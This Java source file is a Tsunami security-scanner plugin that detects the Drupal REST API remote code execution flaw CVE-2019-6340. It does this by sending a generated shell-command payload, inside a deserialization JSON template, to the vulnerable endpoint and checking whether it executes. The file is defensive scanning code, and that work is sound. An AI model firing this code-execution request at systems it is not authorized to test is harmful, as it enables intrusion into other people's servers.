/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.cve20196340;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.post;
import static java.nio.charset.StandardCharsets.UTF_8;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.io.Resources;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/** A Tsunami plugin for detecting CVE-2019-6340. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "DrupalCve20196340Detector",
    version = "0.1",
    description =
        "This plugin detects a Drupal remote code execution (RCE)"
            + " vulnerability via Unsafe Deserialization in REST API",
    author = "Tsunami Team (tsunami-dev@google.com)",
    bootstrapModule = Cve20196340DetectorBootstrapModule.class)
public final class Cve20196340Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  public static final String SAMPLE_STRING = "scanning-CVE-2019-6340";
  public static final String RESPONSE_STRING = "BEGIN" + SAMPLE_STRING + "END";
  public static final String VULNERABLE_PATH = "node/?_format=hal_json";

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;
  private final String payloadFormatString;

  @Inject
  Cve20196340Detector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
    this.payloadGenerator = checkNotNull(payloadGenerator);

    String payloadFormatString = "";
    try {
      payloadFormatString =
          Resources.toString(
              Resources.getResource(this.getClass(), "payloadFormatString.json"), UTF_8);
    } catch (IOException e) {
      logger.atSevere().withCause(e).log(
          "Should never happen. Couldn't load payload resource file");
    }
    this.payloadFormatString = payloadFormatString;
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Cve20196340Detector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String baseUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    logger.atInfo().log("Trying to execute code at '%s'", baseUri);
    return exploitUri(baseUri);
  }

  private boolean exploitUri(String baseUri) {
    String targetUri = baseUri + VULNERABLE_PATH;
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();
    Payload payload = payloadGenerator.generate(config);
    String cmd = payload.getPayload();

    String payloadString = String.format(payloadFormatString, cmd.length(), cmd, baseUri);
    ByteString jsonMsg = ByteString.copyFromUtf8(payloadString);

    try {
      httpClient.send(
          post(targetUri)
              .setHeaders(
                  HttpHeaders.builder().addHeader("Content-Type", "application/hal+json").build())
              .setRequestBody(jsonMsg)
              .build());

    } catch (IOException e) {
      logger.atWarning().withCause(e).log(
          "Fail to exploit '%s'. Maybe it is not vulnerable", targetUri);
    }
    return payload.checkIfExecuted();
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {

    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher("GOOGLE").setValue("CVE_2019_6340"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Drupal RCE CVE-2019-6340 Detected")
                .setDescription(
                    "Some field types do not properly sanitize data from non-form sources in "
                        + "Drupal 8.5.x before 8.5.11 and Drupal 8.6.x before 8.6.10. This can lead"
                        + " to arbitrary PHP code execution in some cases. A site is only affected"
                        + " by this if one of the following conditions is met: The site has the"
                        + " Drupal 8 core RESTful Web Services (rest) module enabled and allows"
                        + " PATCH or POST requests, or the site has another web services module"
                        + " enabled, like JSON:API in Drupal 8, or Services or RESTful Web Services"
                        + " in Drupal 7. (Note: The Drupal 7 Services module itself does not"
                        + " require an update at this time, but you should apply other contributed"
                        + " updates associated with this advisory if Services is in use.)")
                .setRecommendation(
                    "Upgrade to Drupal 8.6.10 or Drupal 8.5.11 with security patches."))
        .build();
  }
}
